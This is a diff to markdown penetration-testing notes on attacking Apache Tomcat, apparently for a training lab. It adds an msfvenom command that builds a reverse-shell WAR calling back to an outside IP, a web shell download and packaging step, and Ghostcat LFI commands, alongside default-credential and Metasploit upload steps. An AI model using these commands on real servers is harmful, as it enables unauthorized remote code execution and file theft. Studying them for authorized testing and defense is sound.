@@ -46,6 +46,16 @@ The `tomcat-users.xml` file is used to allow or disallow access to the /manager 
 <user username="admin" password="admin" roles="manager-gui,admin-gui" />
 ```
 
+```shell
+├── bin
+├── conf
+│   ├── catalina.policy
+│   ├── catalina.properties
+│   ├── context.xml
+│   ├── tomcat-users.xml
+│   ├── tomcat-users.xsd
+│   └── web.xml
+```
 ### Exploitation
 #### Password spraying
 ```
@@ -63,10 +73,12 @@ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /u
 ```
 #### RCE via WAR File Upload
 ```bash
-use  exploit/multi/http/tomcat_mgr_upload
+use exploit/multi/http/tomcat_mgr_upload
 ```
 **Alternatively**
 ```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp 
 ```
@@ -87,3 +99,21 @@ FileOutputStream(f);stream.write(m);o="uPlOaDeD:
 ###### Cleanup
 To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys. Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.
 
+#### Known Vulnerabilities
+##### Ghostcat
+Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)
+
+Nmap output
+```bash
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+8080/tcp open  http    Apache Tomcat 9.0.30
+```
+
+The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
+```shell
+python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
+
+python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
+
+```
